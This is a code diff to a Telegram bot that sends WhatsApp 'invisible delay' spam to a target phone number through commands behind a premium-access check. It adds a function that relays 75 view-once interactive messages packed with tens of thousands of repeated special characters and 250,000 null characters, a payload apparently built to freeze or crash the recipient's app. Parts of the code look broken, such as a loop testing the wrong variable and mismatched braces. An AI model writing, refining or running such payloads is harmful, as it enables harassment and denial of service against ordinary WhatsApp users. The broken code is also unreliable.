@@ -1690,8 +1690,7 @@ Prefix      : /
 ──────────────────────────
 
 A N D R O I D
-/spamandro  : Hard Delay Invisible 70%
-/hardspam   : Delay Hard Invisible 1000% (RISK)
+/spamandro  : Hard Delay Invisible 100%
 
 ──────────────────────────
 
@@ -3400,8 +3399,7 @@ Status      : Success
                     if (!sock) {
                         throw new Error("Socket unavailable");
                     }
-                    await DelayIosSpam(sock, target);
-                    await Xvzzk(sock, target);
+                    await VogueDelay(sock, target);
                     await sleep(3000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -3426,7 +3424,7 @@ Please verify the target input and system status before retrying.`
     }
 });
 
-bot.command('hardspam', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+bot.command('zzz', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
     let args = ctx.message?.text?.split(" ");
     
@@ -4445,6 +4443,67 @@ async function Vdelay(sock, target) {
   }
 }
 
+async function VogueDelay(sock, target) {
+  for (let v = 0; i < 75; v++) {
+    let VnXImg = {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+             imageMessage: {
+               url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
+               directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c",
+              mimetype: 'image/jpeg',
+              caption: 'VnX',
+              mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=",
+              fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=",
+              fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=",
+              fileLength: '19897899',
+              mediaKeyTimestamp: "1778296099",
+              title: "VnX" + "ꦽ".repeat(25000) + "ꦾ".repeat(25000) + "𑆿𑆴𑆿".repeat(25000),
+            },
+            body: { text: "Kenal VnX Gk?" },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamsJson: JSON.stringify({
+                    icon: "",
+                    flow_cta: "{}",
+                    flow_message_version: "3"
+                  })
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson: JSON.stringify({
+                    icon: "\u0000".repeat(250000),
+                    flow_cta: "ꦽ".repeat(25000),
+                    flow_message_version: "3"
+                  })
+                },
+                {
+                  name: "galaxy_message",
+                  buttonParamsJson: JSON.stringify({
+                    icon: "\u0000".repeat(250000),
+                    flow_cta: "ꦽ".repeat(25000),
+                    flow_message_version: "3"
+                  })
+                }
+              ],
+              messageParamsJson: "{}".repeat(25000)
+            }
+          }
+        }
+      }
+    }
+  };
+
+    await sock.relayMessage(target, VnXImg, {
+      messageId: null,
+      participant: { jid: target }
+    });
+  }
+
 //     _       ___  _   _ _   _ _____  _   _        
 //    | |     / _ \| | | | \ | /  __ \| | | |       
 //    | |    / /_\ \ | | |  \| | /  \/| |_| |       
@@ -4468,6 +4527,6 @@ async function Vdelay(sock, target) {
 //    | \__/\| |\ \| | | |/\__/ / | | || |___| |\ \ 
 //     \____/\_| \_\_| |_/\____/\_| |_/\____/\_| \_|
 //                                                  
-//                                                  
+//
 
 bot.launch()
